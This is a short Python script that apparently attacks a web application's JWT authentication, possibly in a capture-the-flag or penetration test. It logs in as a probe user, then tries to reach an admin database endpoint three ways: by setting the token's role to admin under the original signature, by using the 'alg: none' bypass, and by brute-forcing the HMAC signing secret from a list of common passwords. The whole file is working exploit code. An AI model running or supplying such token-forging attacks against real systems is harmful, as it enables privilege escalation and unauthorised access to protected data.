import requests, json, base64, hmac, hashlib
base="https://<host>/ooklakappa"
s=requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0","Accept":"application/json"})
tok=s.post(base+"/api/login",json={"username":"qa_probe_1","password":"Probe12345!"},timeout=20).json()["token"]
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
h,p,sig=tok.split(".")
print("payload:",b64d(p).decode())
def test(tag,t):
    r=s.get(base+"/api/admin/database",headers={"Authorization":"Bearer "+t},timeout=20)
    print(tag,r.status_code,r.text[:200])
# 1 role admin, original sig
pl=json.loads(b64d(p)); pl["role"]="admin"
test("tampered role (sig intact)", h+"."+b64e(json.dumps(pl,separators=(",",":")).encode())+"."+sig)
# 2 alg none
none_hdr=b64e(json.dumps({"alg":"none","typ":"JWT"},separators=(",",":")).encode())
test("alg none", none_hdr+"."+b64e(json.dumps(pl,separators=(",",":")).encode())+".")
# 3 try common secrets
secrets=["secret","changeme","ooklakappa","ookla","password","jwt","django-insecure","SECRET_KEY","supersecret","hackrocks","anci","admin","123456","secretkey","mysecret","test"]
for sec in secrets:
    sg=b64e(hmac.new(sec.encode(),(h+"."+b64e(json.dumps(pl,separators=(",",":")).encode())).encode(),hashlib.sha256).digest())
    r=s.get(base+"/api/admin/database",headers={"Authorization":"Bearer "+h+"."+b64e(json.dumps(pl,separators=(",",":")).encode())+"."+sg},timeout=20)
    if r.status_code==200: print("SECRET FOUND:",sec,r.text[:300]); break
else: print("no common secret matched")
